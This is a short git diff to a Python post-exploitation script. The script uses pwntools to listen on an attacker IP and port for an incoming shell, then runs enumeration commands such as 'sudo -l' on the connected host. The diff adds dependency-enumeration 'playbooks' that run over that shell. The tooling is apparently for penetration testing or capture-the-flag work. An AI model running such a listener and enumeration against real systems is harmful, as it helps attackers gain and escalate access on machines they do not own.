@@ -25,6 +25,10 @@ def main():
         'sudo -l'
     ]
 
+    active_playbooks = [
+        playbooks.enumerate_dependencies.EnumerateDependencies()
+    ]
+
     commands_output = {}
     print(f'Listening {attacker_ip}:{LISTENING_PORT}...')
     with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
@@ -37,9 +41,15 @@ def main():
         for command in long_commands:
             output = shell.send_command_read_cached_temporary_file(command)
             commands_output[command] = output
+        
+        for playbook in active_playbooks:
+            playbook = shell.run_playbook(playbook)
     
     for command, output in commands_output.items():
         print(f'{command}\n--------\n{output}\n--------\n')
+    
+    for playbook in active_playbooks:
+        print(str(playbook))
 
 if __name__ == '__main__':
     main()
